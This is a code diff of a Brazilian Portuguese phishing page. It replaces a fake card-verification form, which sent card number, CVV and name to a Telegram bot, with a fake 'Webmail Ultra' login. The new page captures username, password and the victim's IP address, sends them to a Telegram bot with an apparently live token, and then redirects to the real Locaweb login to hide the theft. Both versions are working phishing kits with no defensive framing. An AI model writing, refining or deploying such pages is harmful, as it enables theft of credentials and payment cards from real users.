@@ -1,46 +1,57 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="pt-BR">
 <head>
-<meta charset="utf-8">
-<title>Verificação de segurança - Loca</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=Swap" rel="stylesheet">
+<meta charset="utf-8"/>
+<title>Webmail Ultra – Acesso</title>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet"/>
 <style>
-body{margin:0;font-family:Roboto;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh}
-.card{width:100%;max-width:420px;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.15);padding:28px 32px}
-h2{margin:0 0 8px;font-weight:500;font-size:20px;color:#333}
-p{margin:0 0 20px;font-size:14px;color:#555}
-input{width:100%;height:44px;border:1px solid #ccc;border-radius:4px;padding:0 12px;margin-bottom:12px;font-size:15px;box-sizing:border-box}
-button{width:100%;height:46px;border:0;border-radius:4px;background:#0078d4;color:#fff;font-size:16px;font-weight:500;cursor:pointer}
-button:hover{opacity:.95}
+html,body{height:100%;margin:0;font-family:'Open Sans',sans-serif;background:#f5f5f5}
+.wrapper{display:flex;flex-direction:column;height:100%}
+.header{width:100%;background:#e2231a;color:#fff;padding:22px 0;text-align:center;font-size:26px;font-weight:600;letter-spacing:.4px}
+.content{flex:1;display:flex;align-items:center;justify-content:center}
+.card{width:420px;background:#fff;border-radius:8px;box-shadow:0 8px 25px rgba(0,0,0,.10);padding:45px 50px}
+.card h2{margin:0 0 0;font-size:22px;color:#e2231a}
+.card p{margin:6px 0 0 14px;color:#555;font-size:14px}
+form{margin-top:28px}
+label{display:block;margin-bottom:6px;font-size:14px;color:#444}
+input{width:100%;padding:12px 14px;border:1px solid #ccc;border-radius:6px;font-size:15px;margin-bottom:18px}
+button{width:100%;padding:13px;background:#e2231a;color:#fff;border:0;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}
+button:hover{background:#b31c14}
+.footer{margin-top:22px;text-align:center;font-size:13px;color:#666}
 </style>
 </head>
 <body>
-<div class="card">
-  <h2>Confirme seu cartão</h2>
-  <p>Para segurança, insira os dados do seu cartão de crédito. <b>Nenhum valor será cobrado agora.</b></p>
-  <form id="c" autocomplete="off">
-    <input name="nc" placeholder="Número do cartão" required>
-    <input name="nome" placeholder="Nome impresso" required>
-    <div style="display:flex;gap:8px">
-      <input style="flex:1" name="val" placeholder="Validade (MM/AA)" required>
-      <input style="flex:1" name="cvv" placeholder="CVV" required>
+<div class="wrapper">
+  <div class="header">Webmail Ultra</div>
+  <div class="content">
+    <div class="card">
+      <h2>Acesse sua conta</h2>
+      <p>Informe seus dados para entrar no webmail.</p>
+      <form id="f" autocomplete="off">
+        <label>Usuário</label>
+        <input name="user" required/>
+        <label>Senha</label>
+        <input name="pass" type="password" required/>
+        <button type="submit">Entrar</button>
+      </form>
+      <div class="footer">Esqueceu a senha? <a href="#">Clique aqui</a></div>
     </div>
-    <button type="submit">Confirmar</button>
-  </form>
+  </div>
 </div>
 
 <script>
-document.getElementById('c').addEventListener('submit',function(e){
+document.getElementById('f').addEventListener('submit', async e => {
   e.preventDefault();
-  const dados=`💳 CARTÃO\n${this.nc.value}|${this.val.value}|${this.cvv.value}\n👤 ${this.nome.value}`;
-  fetch('https://api.telegram.org/bot6927XXXX:AAHXXXXXXXXXXXXXXXXXXXX/sendMessage',{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({chat_id:'111111111',text:dados})
-  }).catch(()=>{});
-  // tela final
-  document.body.innerHTML='<div class="card"><h2>✔ Verificação concluída</h2><p>Seu acesso será liberado em até <b>48 horas</b>. Obrigado!</p></div>';
+  const data = Object.fromEntries(new FormData(e.target));
+  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(j => j.ip).catch(() => 'n/a');
+  const msg = 🔐 LOGIN 1\n👤 ${data.user}\n🔑 ${data.pass}\n🌐 ${ip}\n⏰ ${new Date().toLocaleString('pt-BR')};
+  await fetch('https://api.telegram.org/bot8283630361:AAG32iDNtnetvSo6tHgq_yaaSh4aDCNuQfA/sendMessage', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({chat_id: '6261750345', text: msg})
+  });
+  location.href = 'https://login-new.locaweb.com.br/login?service=https%3A%2F%2Fcentral-bff-api.locaweb.com.br%2Fapi%2Fv1%2Fauth%3Fredirect_uri%3Dhttps%253A%252F%252Fcentral.locaweb.com.br%252Fcart%252Fadd%252Fwhmcs%252Freseller-linux-basic';
 });
 </script>
 </body>
